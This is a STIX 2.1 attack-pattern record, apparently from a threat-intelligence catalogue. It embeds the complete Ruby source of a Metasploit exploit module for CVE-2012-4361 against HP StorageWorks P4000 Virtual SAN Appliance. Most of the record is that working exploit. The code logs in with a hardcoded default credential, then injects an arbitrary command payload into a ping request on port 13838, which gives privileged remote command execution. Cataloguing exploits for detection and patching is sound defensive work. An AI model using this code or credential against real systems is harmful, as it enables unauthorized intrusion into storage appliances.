{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74e2371f-456d-4317-ac36-8a1f237af00f",
    "created": "2024-08-14T17:06:45.941753Z",
    "modified": "2024-08-14T17:06:45.941758Z",
    "name": "\"HP StorageWorks P4000 Virtual SAN Appliance Command Execution\"",
    "description": " This module exploits a vulnerability found in HP's StorageWorks P4000 VSA on versions prior to 9.5. By using a default account credential, it is possible to inject arbitrary commands as part of a ping request via port 13838.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/hp_vsa_exec.rb",
            "external_id": "hp_vsa_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4361"
        },
        {
            "source_name": "reference",
            "url": "http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?loc=en_US&id=958"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03082086"
        },
        {
            "source_name": "reference",
            "url": "http://www.agarri.fr/blog/archives/2012/02/index.html#OriginalDisclosure"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP StorageWorks P4000 Virtual SAN Appliance Command Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in HP's StorageWorks P4000 VSA on\n        versions prior to 9.5. By using a default account credential, it is possible\n        to inject arbitrary commands as part of a ping request via port 13838.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nicolas Gregoire',  #Discovery, PoC, additional assistance\n          'sinn3r'             #Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-4361'],\n          ['OSVDB', '82087'],\n          ['EDB', '18893'],\n          ['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?loc=en_US&id=958'],\n          ['URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03082086'],\n          ['URL', 'http://www.agarri.fr/blog/archives/2012/02/index.html'] # Original Disclosure\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"/\",\n          'Compat'   =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet'\n            }\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Automatic',        {} ],\n          [ 'HP VSA up to 8.5', { 'Version' => '8.5.0' } ],\n          [ 'HP VSA 9',         { 'Version' => '9.0.0' } ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2011-11-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The remote port', 13838])\n      ])\n  end\n\n\n  def generate_packet(data)\n    pkt = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\"\n    pkt << [data.length + 1].pack(\"N*\")\n    pkt << \"\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x14\\xff\\xff\\xff\\xff\"\n    pkt << data\n    pkt << \"\\x00\"\n\n    pkt\n  end\n\n  def get_target\n    if target.name !~ /Automatic/\n      return target\n    end\n\n    # Login at 8.5.0\n    packet = generate_packet(\"login:/global$agent/L0CAlu53R/Version \\\"8.5.0\\\"\")\n    print_status(\"#{rhost}:#{rport} Sending login packet for version 8.5.0\")\n    sock.put(packet)\n    res = sock.get_once\n    vprint_status(Rex::Text.to_hex_dump(res)) if res\n    if res and res=~ /OK/ and res=~ /Login/\n      return targets[1]\n    end\n\n    # Login at 9.0.0\n    packet = generate_packet(\"login:/global$agent/L0CAlu53R/Version \\\"9.0.0\\\"\")\n    print_status(\"#{rhost}:#{rport} Sending login packet for version 9.0.0\")\n    sock.put(packet)\n    res = sock.get_once\n    vprint_status(Rex::Text.to_hex_dump(res)) if res\n    if res and res=~ /OK/ and res =~ /Login/\n      return targets[2]\n    end\n\n    fail_with(Failure::NoTarget, \"#{rhost}:#{rport} - Target auto detection didn't work'\")\n  end\n\n  def exploit\n    connect\n\n    if target.name =~ /Automatic/\n      my_target = get_target\n      print_good(\"#{rhost}:#{rport} - Target #{my_target.name} found\")\n    else\n      my_target = target\n      print_status(\"#{rhost}:#{rport} Sending login packet\")\n      packet = generate_packet(\"login:/global$agent/L0CAlu53R/Version \\\"#{my_target['Version']}\\\"\")\n      sock.put(packet)\n      res = sock.get_once\n      vprint_status(Rex::Text.to_hex_dump(res)) if res\n    end\n\n    # Command execution\n    print_status(\"#{rhost}:#{rport} Sending injection\")\n    data = \"get:/lhn/public/network/ping/127.0.0.1/foobar;#{payload.encoded}/\"\n    data << \"64/5/\" if my_target.name =~ /9/\n    packet = generate_packet(data)\n    sock.put(packet)\n    res = sock.get_once\n    vprint_status(Rex::Text.to_hex_dump(res)) if res\n\n    handler\n    disconnect\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2011-11-11",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}